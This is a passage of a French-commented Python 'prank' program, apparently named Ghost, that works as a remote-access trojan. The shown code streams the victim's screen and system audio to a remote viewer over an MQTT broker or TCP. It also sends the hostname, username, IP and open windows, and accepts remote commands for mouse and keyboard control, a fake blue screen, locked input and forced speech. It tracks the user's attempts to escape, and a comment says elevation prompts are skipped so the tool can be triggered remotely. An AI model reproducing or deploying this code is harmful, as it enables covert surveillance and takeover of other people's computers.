                canvas.create_rectangle(bubble_x - bbw//2, bubble_y - bbh//2, bubble_x + bbw//2, bubble_y + bbh//2, fill="#fef08a", outline="#ca8a04", width=3)
                canvas.create_polygon([
                    bubble_x + bbw//2 - 20, bubble_y + 10,
                    bubble_x + bbw//2 + 25, bubble_y + 35,
                    bubble_x + bbw//2 - 10, bubble_y + bbh//2
                ], fill="#fef08a", outline="#ca8a04", width=2)
                canvas.create_text(bubble_x, bubble_y, text=ad["speech"], font=("Impact", 13, "bold"), fill="#78350f")

            def _draw_giant_message_board(shx, shy):
                ad = anim_data
                scale = ad["board_scale"]
                if scale <= 0.05:
                    return
                    
                cur_bw = int(bw * scale)
                cur_bh = int(bh * scale)
                cx = int(ad["board_x"]) + shx
                cy = int(ad["board_y"]) + shy
                
                bx1 = cx - cur_bw // 2
                by1 = cy - cur_bh // 2
                bx2 = cx + cur_bw // 2
                by2 = cy + cur_bh // 2
                
                # (Ombre panneau supprimée)
                
                # Cadre en bois rustique caramel / chêne chaud (Zéro néon !)
                canvas.create_rectangle(bx1, by1, bx2, by2, fill="#78350f", outline="#451a03", width=max(4, int(8 * scale)))
                canvas.create_rectangle(bx1 + 14, by1 + 14, bx2 - 14, by2 - 14, fill="#92400e", outline="#78350f", width=max(2, int(4 * scale)))
                
                # Clous en laiton aux 4 coins
                nail_r = max(4, int(11 * scale))
                for (nx, ny) in [(bx1 + 24, by1 + 24), (bx2 - 24, by1 + 24), (bx1 + 24, by2 - 24), (bx2 - 24, by2 - 24)]:
                    canvas.create_oval(nx - nail_r, ny - nail_r, nx + nail_r, ny + nail_r, fill="#f59e0b", outline="#78350f", width=2)
                    
                # Parchemin intérieur crème / ivoire chaleureux
                canvas.create_rectangle(bx1 + 30, by1 + 30, bx2 - 30, by2 - 30, fill="#fef3c7", outline="#fde68a", width=3)
                
                # Ruban rouge supérieur ÉNORME
                rub_y = by1 + int(60 * scale)
                rub_h = int(32 * scale)
                rub_indent = int(65 * scale)
                canvas.create_polygon([
                    (bx1 + rub_indent, rub_y - rub_h), (bx2 - rub_indent, rub_y - rub_h),
                    (bx2 - rub_indent + 15, rub_y), (bx2 - rub_indent, rub_y + rub_h),
                    (bx1 + rub_indent, rub_y + rub_h), (bx1 + rub_indent - 15, rub_y)
                ], fill="#dc2626", outline="#991b1b", width=3)
                
                header_font_size = max(12, int(26 * scale))
                canvas.create_text(cx, rub_y, text="📬 MESSAGE DE AHMED 📬", font=("Impact", header_font_size, "bold"), fill="#ffffff")
                
                # Nettoyage et formatage du message
                raw_text = text if text else "Aucun message reçu."
                clean_msg = raw_text.strip()
                if clean_msg.upper().startswith("AHMED:"):
                    clean_msg = clean_msg[6:].strip()
                elif clean_msg.upper().startswith("MESSAGE DE AHMED:"):
                    clean_msg = clean_msg[17:].strip()
                elif clean_msg.upper().startswith("MESSAGE DU VIEWER:"):
                    clean_msg = clean_msg[18:].strip()
                elif clean_msg.upper().startswith("MESSAGE:"):
                    clean_msg = clean_msg[8:].strip()
                    
                display_msg = f"« {clean_msg} »"
                
                # Typographie ÉNORME
                msg_len = len(display_msg)
                if msg_len < 60:
                    base_font_sz = 38
                elif msg_len < 140:
                    base_font_sz = 30
                else:
                    base_font_sz = 24
                    
                actual_font_sz = max(11, int(base_font_sz * scale))
                
                canvas.create_text(
                    cx, cy + int(10 * scale), text=display_msg,
                    font=("Impact", actual_font_sz), fill="#0f172a",
                    width=int(cur_bw * 0.84), justify="center"
                )
                
                # Sceau de cire rouge officiel
                seal_x = bx1 + int(90 * scale)
                seal_y = by2 - int(75 * scale)
                seal_r = int(34 * scale)
                if seal_r > 8:
                    canvas.create_oval(seal_x - seal_r, seal_y - seal_r, seal_x + seal_r, seal_y + seal_r, fill="#b91c1c", outline="#7f1d1d", width=3)
                    canvas.create_text(seal_x, seal_y, text="POSTE\nOFFICIELLE", font=("Impact", max(6, int(9 * scale)), "bold"), fill="#fef08a", justify="center")
                    
                # Grand Bouton 3D vert émeraude
                btn_w = int(320 * scale)
                btn_h = int(60 * scale)
                btn_x1 = cx - btn_w // 2 + int(40 * scale)
                btn_y1 = by2 - int(95 * scale)
                btn_x2 = btn_x1 + btn_w
                btn_y2 = btn_y1 + btn_h
                
                if btn_w > 40:
                    btn_tag = canvas.create_rectangle(btn_x1, btn_y1, btn_x2, btn_y2, fill="#16a34a", outline="#14532d", width=3)
                    canvas.create_line(btn_x1 + 8, btn_y1 + 5, btn_x2 - 8, btn_y1 + 5, fill="#86efac", width=3)
                    btn_txt_sz = max(10, int(18 * scale))
                    btn_text = canvas.create_text(btn_x1 + btn_w//2, btn_y1 + btn_h//2, text="J'AI COMPRIS ! 👍", font=("Impact", btn_txt_sz, "bold"), fill="#ffffff")
                    
                    canvas.tag_bind(btn_tag, "<Button-1>", lambda e: _start_close())
                    canvas.tag_bind(btn_text, "<Button-1>", lambda e: _start_close())
                    canvas.tag_bind(btn_tag, "<Enter>", lambda e: canvas.itemconfig(btn_tag, fill="#22c55e"))
                    canvas.tag_bind(btn_tag, "<Leave>", lambda e: canvas.itemconfig(btn_tag, fill="#16a34a"))
                    
            _tick_anim()
            
            if HAS_WINSOUND:
                try:
                    import winsound
                    def _play_chime():
                        try:
                            winsound.Beep(880, 120)
                            winsound.Beep(1320, 180)
                        except Exception:
                            pass
                    threading.Thread(target=_play_chime, daemon=True).start()
                except Exception:
                    pass
            
            if not root:
                win.mainloop()
        except Exception:
            pass
            
    if root:
        root.after(0, _create_gui)
    else:
        threading.Thread(target=_create_gui, daemon=True).start()

# ==============================================================================
# AUDIO LOOPBACK AND CAPTURE SUPPORT
# ==============================================================================
tcp_send_lock = threading.Lock()
audio_thread_active = False

def find_loopback_device():
    try:
        import sounddevice as sd
        devices = sd.query_devices()
        # 1. Search for WDM-KS "Mixage stéréo", "Stereo Mix", "What U Hear"
        for idx, d in enumerate(devices):
            name_lower = d['name'].lower()
            if d['max_input_channels'] > 0:
                if any(k in name_lower for k in ["mixage st", "stereo mix", "what u hear", "wave out", "loopback"]):
                    return idx, d['max_input_channels'], int(d['default_samplerate'])
        # 2. Fall back to any input device that has "mix"
        for idx, d in enumerate(devices):
            if d['max_input_channels'] > 0 and "mix" in d['name'].lower():
                return idx, d['max_input_channels'], int(d['default_samplerate'])
        # 3. Fall back to default input device
        default_in = sd.default.device[0]
        if default_in >= 0:
            d = sd.query_devices(default_in)
            return default_in, d['max_input_channels'], int(d['default_samplerate'])
    except Exception as e:
        log_debug(f"find_loopback_device error: {e}")
    return None

def convert_and_downsample(raw_bytes, input_channels, input_rate, target_rate=22050):
    try:
        bytes_per_sample = 2
        frame_size = input_channels * bytes_per_sample
        ratio = int(round(input_rate / target_rate))
        if ratio < 1:
            ratio = 1
            
        mono_bytes = bytearray()
        step = ratio * frame_size
        for i in range(0, len(raw_bytes), step):
            mono_bytes.extend(raw_bytes[i:i+2])
        return bytes(mono_bytes)
    except Exception as e:
        log_debug(f"convert_and_downsample error: {e}")
        return raw_bytes

def audio_stream_loop():
    global audio_thread_active, stream_authorized, active_tcp_socket, active_mqtt_client, client_id
    if audio_thread_active:
        return
    audio_thread_active = True
    
    # Force PortAudio dll detection for MSYS2
    import ctypes.util
    orig_find_library = ctypes.util.find_library
    def my_find_library(name):
        res = orig_find_library(name)
        if not res and name == 'portaudio':
            res = orig_find_library('libportaudio')
        return res
    ctypes.util.find_library = my_find_library
    
    dll_dir = r"C:\msys64\ucrt64\bin"
    if os.path.exists(dll_dir):
        os.environ["PATH"] = dll_dir + os.pathsep + os.environ.get("PATH", "")
        if hasattr(os, "add_dll_directory"):
            try:
                os.add_dll_directory(dll_dir)
            except Exception:
                pass
                
    try:
        import sounddevice as sd
        import queue
    except Exception as e:
        log_debug(f"Audio stream error: import failed: {e}")
        audio_thread_active = False
        return
        
    device_info = find_loopback_device()
    if not device_info:
        log_debug("Audio stream error: no loopback or input device found")
        audio_thread_active = False
        return
        
    dev_idx, dev_channels, dev_rate = device_info
    log_debug(f"Audio stream started on device {dev_idx} ({dev_channels} channels, {dev_rate} Hz)")
    
    chunk_duration = 0.15
    block_size = int(dev_rate * chunk_duration)
    audio_queue = queue.Queue()
    
    def callback(indata, frames, time_info, status):
        audio_queue.put(bytes(indata))
        
    try:
        with sd.RawInputStream(device=dev_idx,
                                channels=dev_channels,
                                callback=callback,
                                samplerate=dev_rate,
                                blocksize=block_size,
                                dtype='int16'):
            while stream_authorized:
                try:
                    raw_chunk = audio_queue.get(timeout=0.5)
                except queue.Empty:
                    continue
                    
                processed_chunk = convert_and_downsample(raw_chunk, dev_channels, dev_rate, 22050)
                
                # Check target connections
                if active_tcp_socket:
                    try:
                        packet = (3).to_bytes(4, byteorder='big') + len(processed_chunk).to_bytes(4, byteorder='big') + processed_chunk
                        with tcp_send_lock:
                            active_tcp_socket.sendall(packet)
                    except Exception:
                        pass
                elif active_mqtt_client and client_id:
                    try:
                        client_topic = f"{MQTT_TOPIC}/{client_id}"
                        active_mqtt_client.publish(client_topic + "/audio", processed_chunk, qos=0)
                    except Exception:
                        pass
    except Exception as e:
        log_debug(f"Audio stream loop error: {e}")
        
    audio_thread_active = False
    log_debug("Audio streaming stopped")

def stream_screen_loop():
    global stream_authorized, stream_thread_active, VIEWER_IP, VIEWER_PORT, mouse_locked
    global stream_fps, stream_quality
    if not stream_authorized or not HAS_PILLOW:
        return
        
    stream_thread_active = True
    sys_info = get_real_system_info()
    
    while stream_authorized:
        # Tenter d'auto-découvrir l'IP de la visionneuse
        is_local = discover_viewer_ip()
        
        if not is_local:
            # Mode CLOUD via MQTT
            global active_mqtt_client, client_id
            mqtt_client = None
            try:
                import paho.mqtt.client as mqtt
                mqtt_client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
                try:
                    mqtt_client.max_queued_messages_set(2)
                except Exception:
                    pass
                active_mqtt_client = mqtt_client
                
                # Définir le canal unique basé sur le nom d'hôte et le nom d'utilisateur de la machine
                client_id = f"{sys_info.get('hostname', 'unknown').lower()}_{sys_info.get('username', 'unknown').lower()}".replace(" ", "_")
                client_topic = f"{MQTT_TOPIC}/{client_id}"
                
                # Last Will and Testament (LWT) pour avertir immédiatement les viewers si le script s'arrête ou crash
                lwt_payload = json.dumps({"status": "offline", "target_id": client_id, "timestamp": time.time()})
                try:
                    mqtt_client.will_set(f"{client_topic}/status", lwt_payload.encode('utf-8'), qos=1, retain=True)
                except Exception:
                    pass

                # Fonction pour diffuser les infos système en direct (sans retain pour ne pas persister après arrêt)
                def broadcast_sys_info():
                    try:
                        s_info = json.dumps({
                            "hostname": sys_info.get("hostname", "Inconnu"),
                            "username": sys_info.get("username", "Inconnu"),
                            "os": sys_info.get("os", "Windows"),
                            "ip": sys_info.get("ip", "127.0.0.1"),
                            "client_topic": client_topic,
                            "timestamp": time.time(),
                            "windows": get_open_windows()
                        })
                        mqtt_client.publish(MQTT_TOPIC + "/info", s_info.encode('utf-8'), qos=0, retain=False)
                        mqtt_client.publish(f"{client_topic}/info", s_info.encode('utf-8'), qos=0, retain=False)
                    except Exception:
                        pass
                
                # Callback de réception des commandes (troll et arrêt)
                def on_client_mqtt_message(client, userdata, msg):
                    global stream_authorized, stream_fps, stream_quality
                    global prank_keys_active
                    if msg.topic == MQTT_TOPIC + "/request_info":
                        broadcast_sys_info()
                        return
                    if msg.topic == client_topic + "/cmd":
                        try:
                            cmd_data = json.loads(msg.payload.decode('utf-8'))
                            if cmd_data.get("action") == "troll_msg":
                                show_troll_window_on_client(cmd_data.get("text"))
                            elif cmd_data.get("action") == "stop_stream":
                                stop_stream_capture()
                            elif cmd_data.get("action") == "stop_protocol":
                                trigger_stop_protocol_remotely()
                            elif cmd_data.get("action") in ("kill_client", "exit_script"):
                                instant_emergency_kill("Fermeture totale demandee a distance (MQTT)")
                            elif cmd_data.get("action") == "start_protocol":
                                trigger_start_protocol_remotely()
                            elif cmd_data.get("action") == "update_stream_settings":
                                stream_fps = max(5, min(int(cmd_data.get("fps", 12)), 40))
                                stream_quality = max(5, min(int(cmd_data.get("quality", 60)), 100))
                            elif cmd_data.get("action") == "toggle_drift":
                                toggle_mouse_drift(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_pixels":
                                toggle_dead_pixels(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_prank_keys":
                                toggle_prank_keys(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_ghost_sounds":
                                toggle_ghost_sounds(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_drunk_mouse":
                                toggle_drunk_mouse(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_invisible_wall":
                                toggle_invisible_wall(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_system_tts":
                                toggle_system_tts(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_screen_rotate":
                                toggle_screen_rotate(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_elusive_window":
                                toggle_elusive_window(cmd_data.get("active", False), cmd_data.get("extra", ""))
                            elif cmd_data.get("action") == "toggle_monkey_volume":
                                toggle_monkey_volume(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_bsod":
                                if cmd_data.get("active", False):
                                    if root:
                                        root.after(0, show_bsod)
                                    else:
                                        show_bsod()
                                else:
                                    hide_bsod()
                            elif cmd_data.get("action") == "toggle_remote_control":
                                toggle_remote_control_remotely(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "remote_input":
                                handle_remote_input(cmd_data)
                        except Exception:
                            pass
                            
                mqtt_client.on_message = on_client_mqtt_message
                def on_client_mqtt_disconnect(*args, **kwargs):
                    toggle_remote_control_remotely(False)
                mqtt_client.on_disconnect = on_client_mqtt_disconnect
                mqtt_client.connect(MQTT_BROKER, MQTT_PORT, 60)
                mqtt_client.subscribe(client_topic + "/cmd")
                mqtt_client.subscribe(MQTT_TOPIC + "/request_info")
                mqtt_client.loop_start()
                
                # Signaler l'appareil en ligne aux viewers
                online_payload = json.dumps({"status": "online", "target_id": client_id, "timestamp": time.time()})
                mqtt_client.publish(f"{client_topic}/status", online_payload.encode('utf-8'), qos=1, retain=True)

                # Envoyer les informations système (sans retain)
                broadcast_sys_info()
                
                # Start audio loopback streaming thread
                threading.Thread(target=audio_stream_loop, daemon=True).start()
                
                last_info_send_time = time.time()
                while stream_authorized:
                    t_start = time.time()
                    try:
                        # Largeur dynamique selon les FPS pour garantir fluidité sans engorgement MQTT
                        target_w = 1024 if stream_fps > 18 else 1280
                        eff_quality = min(75, max(25, stream_quality))
                        jpeg_data = capture_and_encode_frame(max_w=target_w, quality=eff_quality)
                        if jpeg_data:
                            mqtt_client.publish(client_topic, jpeg_data, qos=0)
                    except Exception:
                        pass
                    
                    # Mise à jour périodique des infos et de la liste des fenêtres ouvertes
                    now = time.time()
                    if now - last_info_send_time > 8.0:
                        broadcast_sys_info()
                        last_info_send_time = now
                        
                    elapsed = time.time() - t_start
                    sleep_time = max(0.002, (1.0 / stream_fps) - elapsed)
                    time.sleep(sleep_time)
                    
            except Exception:
                time.sleep(3.0)
            finally:
                if mqtt_client and client_id:
                    try:
                        offline_msg = json.dumps({"status": "offline", "target_id": client_id, "timestamp": time.time()})
                        mqtt_client.publish(f"{MQTT_TOPIC}/{client_id}/status", offline_msg.encode('utf-8'), qos=1, retain=True)
                        mqtt_client.publish(MQTT_TOPIC + "/info", b"", qos=1, retain=True)
                        time.sleep(0.1)
                    except Exception:
                        pass
                active_mqtt_client = None
                if mqtt_client:
                    try:
                        mqtt_client.loop_stop()
                        mqtt_client.disconnect()
                    except Exception:
                        pass
        else:
            # Mode LOCAL en TCP direct
            global active_tcp_socket
            s = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                active_tcp_socket = s
                s.settimeout(4.0)
                s.connect((VIEWER_IP, VIEWER_PORT))
                s.settimeout(None)
                
                # Envoyer les informations système (JSON)
                info_data = json.dumps({
                    "hostname": sys_info.get("hostname", "Inconnu"),
                    "username": sys_info.get("username", "Inconnu"),
                    "os": sys_info.get("os", "Windows"),
                    "ip": sys_info.get("ip", "127.0.0.1"),
                    "windows": get_open_windows()
                }).encode('utf-8')
                
                with tcp_send_lock:
                    s.sendall(len(info_data).to_bytes(4, byteorder='big') + info_data)
                
                # Lancer le thread de réception TCP
                def tcp_recv_thread(sock):
                    global stream_authorized, stream_fps, stream_quality
                    global prank_keys_active
                    while stream_authorized:
                        try:
                            size_bytes = recv_exact(sock, 4)
                            if not size_bytes:
                                break
                            size = int.from_bytes(size_bytes, byteorder='big')
                            msg_bytes = recv_exact(sock, size)
                            if not msg_bytes:
                                break
                            cmd_data = json.loads(msg_bytes.decode('utf-8'))
                            if cmd_data.get("action") == "troll_msg":
                                show_troll_window_on_client(cmd_data.get("text"))
                            elif cmd_data.get("action") == "stop_stream":
                                stop_stream_capture()
                                break
                            elif cmd_data.get("action") == "stop_protocol":
                                trigger_stop_protocol_remotely()
                            elif cmd_data.get("action") in ("kill_client", "exit_script"):
                                instant_emergency_kill("Fermeture totale demandee a distance (TCP)")
                                break
                            elif cmd_data.get("action") == "start_protocol":
                                trigger_start_protocol_remotely()
                            elif cmd_data.get("action") == "update_stream_settings":
                                stream_fps = max(5, min(int(cmd_data.get("fps", 12)), 40))
                                stream_quality = max(5, min(int(cmd_data.get("quality", 60)), 100))
                            elif cmd_data.get("action") == "toggle_drift":
                                toggle_mouse_drift(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_pixels":
                                toggle_dead_pixels(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_prank_keys":
                                toggle_prank_keys(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_ghost_sounds":
                                toggle_ghost_sounds(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_drunk_mouse":
                                toggle_drunk_mouse(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_invisible_wall":
                                toggle_invisible_wall(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_system_tts":
                                toggle_system_tts(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_screen_rotate":
                                toggle_screen_rotate(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_elusive_window":
                                toggle_elusive_window(cmd_data.get("active", False), cmd_data.get("extra", ""))
                            elif cmd_data.get("action") == "toggle_monkey_volume":
                                toggle_monkey_volume(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "toggle_bsod":
                                if cmd_data.get("active", False):
                                    if root:
                                        root.after(0, show_bsod)
                                    else:
                                        show_bsod()
                                else:
                                    hide_bsod()
                            elif cmd_data.get("action") == "toggle_remote_control":
                                toggle_remote_control_remotely(cmd_data.get("active", False))
                            elif cmd_data.get("action") == "remote_input":
                                handle_remote_input(cmd_data)
                        except Exception:
                            break
                    toggle_remote_control_remotely(False)
                            
                threading.Thread(target=tcp_recv_thread, args=(s,), daemon=True).start()
                
                # Start audio loopback streaming thread
                threading.Thread(target=audio_stream_loop, daemon=True).start()
                
                # Envoyer les captures d'écran en boucle
                last_info_send_time = time.time()
                while stream_authorized:
                    t_start = time.time()
                    try:
                        target_w = 1280 if stream_fps > 20 else 1600
                        eff_quality = min(80, max(25, stream_quality))
                        jpeg_data = capture_and_encode_frame(max_w=target_w, quality=eff_quality)
                        if jpeg_data:
                            # Prefix with packet type 0 (image) and length
                            with tcp_send_lock:
                                s.sendall((0).to_bytes(4, byteorder='big') + len(jpeg_data).to_bytes(4, byteorder='big') + jpeg_data)
                    except Exception:
                        break
                    
                    # Mise à jour périodique de la liste des fenêtres ouvertes
                    now = time.time()
                    if now - last_info_send_time > 8.0:
                        try:
                            win_data = json.dumps({"windows": get_open_windows()}).encode('utf-8')
                            with tcp_send_lock:
                                s.sendall((1).to_bytes(4, byteorder='big') + len(win_data).to_bytes(4, byteorder='big') + win_data)
                        except Exception:
                            pass
                        last_info_send_time = now
                        
                    elapsed = time.time() - t_start
                    sleep_time = max(0.002, (1.0 / stream_fps) - elapsed)
                    time.sleep(sleep_time)
                    
            except Exception:
                time.sleep(3.0) # Attendre avant reconnexion
            finally:
                active_tcp_socket = None
                if s:
                    try:
                        s.close()
                    except Exception:
                        pass
                        
    stream_thread_active = False

last_typing_beep_time = 0.0

def play_typing_sound(char=None):
    global last_typing_beep_time
    if not HAS_WINSOUND:
        return
    # Ne pas jouer de son pour les espaces, les retours à la ligne ou la tabulation
    if char in (' ', '\n', '\r', '\t'):
        return
    now = time.time()
    # Réduire la latence en enlevant ou réduisant fortement la limite de temps
    if now - last_typing_beep_time >= 0.015:
        last_typing_beep_time = now
        try:
            # Sons mécaniques de clic de piratage très courts et aigus (satisfaisants)
            freq = random.randint(1600, 2400)
            threading.Thread(target=lambda: winsound.Beep(freq, 4), daemon=True).start()
        except Exception:
            pass

def play_backspace_sound():
    if not HAS_WINSOUND:
        return
    try:
        # Son mécanique rétro pour les retours arrière (fréquence plus basse)
        freq = random.randint(280, 320)
        threading.Thread(target=lambda: winsound.Beep(freq, 15), daemon=True).start()
    except Exception:
        pass

# Configuration ctypes pour la compatibilité 64-bits (prévention de la troncature et des erreurs de conversion des handles)
ctypes.windll.user32.GetForegroundWindow.restype = ctypes.c_void_p

ctypes.windll.user32.GetParent.restype = ctypes.c_void_p
ctypes.windll.user32.GetParent.argtypes = [ctypes.c_void_p]

ctypes.windll.user32.GetAncestor.restype = ctypes.c_void_p
ctypes.windll.user32.GetAncestor.argtypes = [ctypes.c_void_p, ctypes.c_uint]

ctypes.windll.user32.SetWindowsHookExW.restype = ctypes.c_void_p
ctypes.windll.user32.SetWindowsHookExW.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong]

ctypes.windll.kernel32.GetModuleHandleW.restype = ctypes.c_void_p
ctypes.windll.kernel32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]

ctypes.windll.user32.CallNextHookEx.restype = ctypes.c_longlong
ctypes.windll.user32.CallNextHookEx.argtypes = [ctypes.c_void_p, ctypes.c_int, wintypes.WPARAM, ctypes.c_void_p]

ctypes.windll.user32.FindWindowW.restype = ctypes.c_void_p
ctypes.windll.user32.FindWindowW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p]

ctypes.windll.shell32.ShellExecuteW.restype = ctypes.c_void_p
ctypes.windll.shell32.ShellExecuteW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_int]

ctypes.windll.user32.IsWindow.argtypes = [ctypes.c_void_p]
ctypes.windll.user32.GetWindowTextLengthW.argtypes = [ctypes.c_void_p]
ctypes.windll.user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]

ctypes.windll.user32.SetWindowPos.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_uint]
ctypes.windll.user32.ShowWindow.argtypes = [ctypes.c_void_p, ctypes.c_int]
ctypes.windll.user32.GetWindowThreadProcessId.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
ctypes.windll.user32.UnhookWindowsHookEx.argtypes = [ctypes.c_void_p]


class GhostLaunchError(Exception):
    """Exception levée en cas d'échec critique de lancement d'une application cible."""
    pass

def is_admin():
    """Vérifie si le script actuel dispose des droits administrateur."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def elevate_privileges():
    """
    Mode standard : Aucune demande d'élévation UAC pour permettre
    un déclenchement à distance fluide sans intervention physique sur le PC.
    """
    return

# ==============================================================================
# 1. CONFIGURATION ET VARIABLES GLOBALES
# ==============================================================================

# Vitesse de frappe progressive pour le Bloc-notes (Notepad) - Lettre par lettre
NOTEPAD_TYPING_MIN = 0.005
NOTEPAD_TYPING_MAX = 0.02

# Vitesse de saisie dans l'invite de commande (CMD) - Lettre par lettre
CMD_TYPING_DELAY = 0.025

# Durée des pauses de chargement de l'OS et des applications (en secondes)
PAUSE_DURATION = 1.2

# États de contrôle globaux
mouse_locked = False
current_allowed_hwnd = None
root = None
is_launching = False
scenario_thread = None

# Suivi de l'état des touches pour le backdoor de secours
is_ctrl_pressed = False
is_shift_pressed = False
is_alt_pressed = False

cmd_troll_queue = []
notepad_troll_queue = []
active_troll_hwnds = set()
active_troll_wins = set()
protocol_running = False
stream_fps = 12
stream_quality = 60
emergency_prompt_open = False
cmd_typing_active = False
notepad_typing_active = False
cmd_troll_active = False
notepad_troll_active = False
cmd_typing_lock = threading.RLock()
notepad_typing_lock = threading.RLock()

# Handles des fenêtres actives
cmd_hwnd = None
notepad_hwnd = None
tkinter_hwnd = None

# Références des fenêtres et widgets Tkinter simulés
cmd_window = None
notepad_window = None
cmd_text_widget = None
notepad_text_widget = None
dialog_is_open = False
active_dialog = None
active_dialog_event = None

# Variables d'état pour les trolls avancés
mouse_drift_active = False
dead_pixels_active = False
dead_pixel_windows = []
prank_keys_active = False
ghost_sounds_active = False
bsod_window = None

# Nouveaux Trolls
drunk_mouse_active = False
invisible_wall_active = False
system_tts_active = False
screen_rotate_active = False
elusive_window_active = False
elusive_window_title = ""
remote_control_active = False
monkey_volume_active = False

# Références globales de connexion réseau
active_mqtt_client = None
active_tcp_socket = None
client_id = None

def is_developer_pc():
    """
    Détermine si le script s'exécute sur le PC de développement.
    Vérifie le nom de la machine (Pc-Zakriev), le nom d'utilisateur (zakri),
    ou la présence de fichiers de développement à proximité.
    """
    try:
        hostname = socket.gethostname().lower()
        if hostname == "pc-zakriev":
            return True
    except Exception:
        pass
        
    try:
        username = os.getlogin().lower()
        if username == "zakri":
            return True
    except Exception:
        pass
        
    # Vérifier si ghost_viewer.py est présent dans le dossier actuel ou parent
    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        if os.path.exists(os.path.join(current_dir, "ghost_viewer.py")):
            return True
        parent_dir = os.path.dirname(current_dir)
        if os.path.exists(os.path.join(parent_dir, "ghost_viewer.py")):
            return True
    except Exception:
        pass
        
    return False



# Détection et compteurs de comportement du spectateur
mouse_fight_count = 0
notepad_close_count = 0
cmd_close_count = 0
alt_tab_attempt_count = 0
escape_attempt_count = 0
alt_f4_attempt_count = 0
win_key_attempt_count = 0
task_manager_attempt_count = 0
focus_loss_attempt_count = 0
shutdown_count = 0

# Variables globales pour la détection de spam clavier
blocked_key_times = []
spam_window_active = False
spam_window = None
spam_text_widget = None
spam_hwnd = None

# Constantes pour la simulation d'événements clavier Windows
VK_ALT = 0x12
KEYEVENTF_KEYUP = 0x0002

# Constantes pour la manipulation de fenêtres (Topmost)
HWND_TOPMOST = -1
HWND_NOTOPMOST = -2
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001

# Références pour le panneau overlay et la pluie Matrix
matrix_canvas = None
matrix_drops = []
matrix_running = False
overlay_glow = None
overlay_frame = None
screen_text_widget = None
label_header = None
label_status = None

# ==============================================================================
# 2. INTERFACE DE SIMULATION DE CMD ET NOTEPAD (NATIVE TKINTER)
# ==============================================================================

def center_window(window, width, height, offset_x=0, offset_y=0):
    """
    Centre une fenêtre Tkinter sur l'écran avec un décalage optionnel.
    """
    try:
        screen_width = window.winfo_screenwidth()
        screen_height = window.winfo_screenheight()
        x = (screen_width // 2) - (width // 2) + offset_x
        y = (screen_height // 2) - (height // 2) + offset_y
        window.geometry(f"{width}x{height}+{x}+{y}")
    except Exception:
        pass

def shake_window(window):
    """
    Simule une animation de secousse sur une fenêtre pour indiquer une action bloquée.
    Utilise root.after() au lieu de time.sleep()+update() pour éviter la réentrance
    dans la boucle d'événements Tkinter (qui provoque un freeze/crash).
    """
    try:
        x = window.winfo_x()
        y = window.winfo_y()
        
        def _do_shake(step):
            try:
                if not window.winfo_exists():
                    return
                if step < 8:
                    dx = 10 if step % 2 == 0 else -10
                    window.geometry(f"+{x + dx}+{y}")
                    window.after(20, lambda: _do_shake(step + 1))
                else:
                    window.geometry(f"+{x}+{y}")
            except Exception:
                pass
        
        _do_shake(0)
    except Exception:
        pass

def write_to_cmd(text):
    """
    Écrit du texte de façon thread-safe dans le widget text du CMD simulé.
    """
    if root and cmd_text_widget:
        root.after(0, lambda: _write_to_cmd_gui(text))

def _write_to_cmd_gui(text):
    try:
        cmd_text_widget.insert("insert", text)
        cmd_text_widget.see("insert")
    except Exception:
        pass

def overwrite_last_line_cmd(text):
    """
    Remplace la dernière ligne du terminal CMD simulé par un nouveau texte (thread-safe).
    """
    if root and cmd_text_widget:
        root.after(0, lambda: _overwrite_last_line_cmd_gui(text))

def _overwrite_last_line_cmd_gui(text):
    try:
        # Trouver le début de la dernière ligne non vide (ou juste la dernière ligne)
        # "insert-1c linebreak"
        # Tkinter index "insert linestart" donne le début de la ligne courante
        cmd_text_widget.delete("insert linestart", "insert")
        cmd_text_widget.insert("insert", text)
        cmd_text_widget.see("insert")
    except Exception:
        pass

def write_to_notepad(text):
    """
    Écrit du texte de façon thread-safe dans le widget text du Notepad simulé.
    """
    if root and notepad_text_widget:
        root.after(0, lambda: _write_to_notepad_gui(text))

def _write_to_notepad_gui(text):
    try:
        notepad_text_widget.insert("insert", text)
        notepad_text_widget.see("insert")
    except Exception:
        pass

def delete_last_char_notepad():
    """
    Supprime de façon thread-safe le dernier caractère du Notepad simulé.
    """
    if root and notepad_text_widget:
        root.after(0, _delete_last_char_notepad_gui)

def _delete_last_char_notepad_gui():
    try:
        notepad_text_widget.delete("insert-1c", "insert")
        notepad_text_widget.see("insert")
    except Exception:
        pass

def generate_dynamic_troll_message(technique):
    global escape_attempt_count, alt_f4_attempt_count, alt_tab_attempt_count
    global win_key_attempt_count, task_manager_attempt_count, focus_loss_attempt_count
